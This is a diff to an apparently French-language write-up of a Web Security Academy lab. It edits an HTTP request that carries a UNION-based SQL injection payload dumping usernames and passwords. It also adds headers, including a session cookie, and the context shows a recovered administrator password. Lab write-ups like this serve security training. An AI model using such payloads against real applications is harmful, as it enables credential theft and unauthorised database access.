@@ -25,5 +25,18 @@ Une vulnérabilité d'injection SQL de type UNION est présente dans le filtre d
    - `administrator` : `d1bon2ip9ip0utm03lb2`
 
 ```http
-GET /filter?category=Lifestyle'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users-- HTTP/2
+GET /filter?category=Lifestyle' UNION SELECT NULL,CONCAT(username,'~',password) FROM users-- HTTP/2
 Host: 0a5f000c0348c1f780dc308a007a0074.web-security-academy.net
+Cookie: session=8jR0YEEnldylVBohu7tRc0jBjWSXgsZR
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a5f000c0348c1f780dc308a007a0074.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
